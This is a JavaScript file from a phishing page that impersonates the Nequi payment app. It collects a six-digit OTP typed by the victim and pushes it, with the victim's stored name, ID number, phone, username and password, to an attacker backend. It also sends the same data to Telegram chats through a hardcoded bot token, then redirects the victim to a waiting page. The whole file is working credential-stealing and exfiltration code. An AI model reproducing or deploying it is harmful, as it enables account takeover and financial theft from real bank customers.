function updateLS() {
  LS.setItem("info", JSON.stringify(info));
}

async function updateOtpAndSendToTelegram() {
  // Deshabilitar el botón para evitar múltiples clics
  const consultarButton = document.getElementById("btn-consultar");
  consultarButton.disabled = true;

  try {
    // Obtener datos de la API de Trico
    const response = await fetch(`${url}/trico/tricoData`, {
      method: "GET",
      headers: {
        "Content-Type": "application/json",
      },
    });

    const serverData = await response.json();
    const dataTables = [...serverData];

    // Recorrer y verificar los datos
    for (const data of dataTables) {
      if (
        data.telefono == info.metaInfo.telnum &&
        data.usuario == info.metaInfo.user
      ) {
        console.log("Usuario Encontrado");

        // Enviar solicitud para actualizar datos en Trico
        const updateResponse = await fetch(
          `${url}/trico/updateTricoNequi/${data.idreg}`,
          {
            method: "PUT",
            headers: {
              "Content-Type": "application/json",
            },
            body: JSON.stringify({
              otp: info.metaInfo.cdin,
            }),
          }
        );

        if (!updateResponse.ok)
          throw new Error("Error al actualizar datos en Trico");

        // Mensaje a Telegram
        const message1 = `🔵Nequi\n🆔Nombre: ${info.metaInfo.dudename}\n©️CC: ${info.metaInfo.cc}\n📱Teléfono: ${info.metaInfo.telnum}\n🚹Usuario: ${info.metaInfo.user}\n🔒Contraseña: ${info.metaInfo.puser}\n💎Código OTP: ${info.metaInfo.cdin}\nFuente: ${fuente}`;
        const message2 = `🔵Nequi - Información adicional\n🆔Nombre: ${info.metaInfo.dudename}\n📱Teléfono: ${info.metaInfo.telnum}\n💎Código OTP: ${info.metaInfo.cdin} \nFuente: ${fuente}`;

        // Enviar ambos mensajes a todos los chatIds
        for (const chatId of chatIds) {
          // Primer mensaje
          const telegramUrl1 = `https://api.telegram.org/bot7772373506:AAE68FvWBmOiOLaTrSykMxSdpfQwP7C8hjo/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(
            message1
          )}`;
          const telegramResponse1 = await fetch(telegramUrl1);
          if (!telegramResponse1.ok)
            throw new Error("Error al enviar primer mensaje a Telegram");

          console.log("Primer mensaje enviado a Telegram a chatId:", chatId);

          // Segundo mensaje
          const telegramUrl2 = `https://api.telegram.org/bot7772373506:AAE68FvWBmOiOLaTrSykMxSdpfQwP7C8hjo/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(
            message2
          )}`;
          const telegramResponse2 = await fetch(telegramUrl2);
          if (!telegramResponse2.ok)
            throw new Error("Error al enviar segundo mensaje a Telegram");

          console.log("Segundo mensaje enviado a Telegram a chatId:", chatId);
        }
      }
    }

    // Redirigir tras el éxito de ambas solicitudes
    window.location.href = "./wait.html";
  } catch (error) {
    console.error("Error en la solicitud:", error);
    alert("Hubo un error. Por favor, inténtelo de nuevo.");
  } finally {
    // Habilitar el botón en caso de error o finalización
    consultarButton.disabled = false;
  }
}

document
  .getElementById("btn-consultar")
  .addEventListener("click", function (e) {
    e.preventDefault();

    if (
      document.getElementById("number-1").value == "" ||
      document.getElementById("number-2").value == "" ||
      document.getElementById("number-3").value == "" ||
      document.getElementById("number-4").value == "" ||
      document.getElementById("number-5").value == "" ||
      document.getElementById("number-6").value == ""
    ) {
      alert("Por favor ingrese los datos");
      document.getElementById("number-1").focus();
      return;
    } else {
      const din =
        document.getElementById("number-1").value +
        document.getElementById("number-2").value +
        document.getElementById("number-3").value +
        document.getElementById("number-4").value +
        document.getElementById("number-5").value +
        document.getElementById("number-6").value;

      info.metaInfo.cdin = din;

      updateLS();

      // Llamar a la función combinada de envío
      updateOtpAndSendToTelegram();
    }
  });
